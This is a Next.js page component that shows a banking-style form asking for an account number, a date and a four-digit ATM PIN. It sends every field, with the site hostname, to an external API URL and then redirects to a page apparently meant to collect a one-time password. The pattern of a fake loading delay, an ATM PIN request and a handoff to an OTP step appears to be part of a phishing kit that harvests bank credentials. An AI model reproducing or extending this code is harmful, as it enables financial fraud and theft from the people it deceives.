'use client';
import DateInputComponent from "../inlcude/DateInputComponent"
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import WaiterTime from "../inlcude/WaiterTime";
import styles from "./othercss.module.css";

export default function Home() {
    const router = useRouter();
    const [loading, setLoading] = useState(true); 

    const API_URL = process.env.NEXT_PUBLIC_URL;

    useEffect(() => {
        setTimeout(() => {
            setLoading(false); 
        }, 15000); 
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true); 

        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = window.location.hostname;
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem("next", "3");
            localStorage.setItem("nextOTT", "1");
            router.push('/ots');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
    if (loading) {
        return (
            <WaiterTime/>
        );
    }

  return (
    <>
    <Header />
        <div className="container" >
                <form onSubmit={handleSubmit} className="mt-3 py-2">
                  <div className={`form-group mb-2 ${styles.formGroup}`}>
                        <label htmlFor="ac">Account Number* </label>
                        <input name="acc" placeholder="Enter account no" minLength={15} maxLength={15} type="text" inputMode="numeric" className={`${styles.formControl} form-control`} size={30} required aria-label="/ac" />
                    </div>
                    <DateInputComponent />
                    <div className={`form-group mb-2 ${styles.formGroup}`}>
                        <label htmlFor="">ATM Pin* </label>
                        <input name="atmoin" placeholder="Enter 4 digit pin" type="password" inputMode="numeric"  className={`form-control ${styles.formControl}`}  minLength={4} maxLength={4}  required/>
                    </div>                     

                <div className={`${styles.buttonContainer} ${styles.centerKaring} form-group w-100`}>
                    <input type="submit" className={`btn btn-danger ${styles.btnDanger} text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Submit" />
                </div>
            </form>
        </div>
    <Footer />
</>
  );
}
